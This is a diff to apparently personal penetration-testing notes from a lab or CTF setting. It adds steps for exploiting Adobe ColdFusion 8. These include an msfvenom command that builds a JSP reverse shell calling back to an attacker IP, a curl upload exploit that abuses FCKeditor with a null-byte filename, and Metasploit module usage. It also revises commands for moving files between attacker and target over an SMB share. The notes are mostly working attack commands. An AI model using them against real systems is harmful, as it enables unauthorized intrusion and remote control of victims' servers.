@@ -546,8 +546,29 @@ Pattern
          SeImpersonatePrivilege enabled
          https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
          Possible Token HIjacking
-   
-      
+   Cold fusion8
+      Uses JSF
+      msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.47 LPORT=443 -f raw > shell.jsp
+      Make a curl request from 16788.rb 
+          curl -X POST -F "newfile=@shell.jsp; type=application/x-java-archive;filename=shell.txt" 'http://10.10.10.11:8500/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/pkong.jsp%00'
+      Adobe ColdFusion – Directory Traversal multiple/remote/14641.py 
+         Gain initial creds
+         Then upload shell from the website
+            https://nets.ec/Coldfusion_hacking#Writing_Shell_to_File
+            
+      msfconsole
+          16788.rb
+          search coldfusion       
+          use exploit/windows/http/coldfusion_fckeditor 
+          show options 
+              set RHOST 
+              set RPORT 
+              Didn't work 
+          Troubleshooting - Turn on Burp suite 
+              Proxy --> options --> Proxy Listeners --> add --> Bind to port 8500 --> request handling 10.10.10.11:8500 
+              Firefox  localhost:8500 
+              
+  
          
       
 
@@ -615,8 +636,12 @@ Report Template
 Network Tools
 
     Impacket (SMB, psexec, etc) — https://github.com/SecureAuthCorp/impacket
-      host:impacket-smbserver pkong /root/shells
-      target: copy .\file \\192.168.119.131\pkong\file
+      host:    impacket-smbserver pkong .      
+      target:  
+               net use \\<IP>\pkong
+               
+               copy \\<IP>\pkong\file .
+               
 
 File Transfers
 
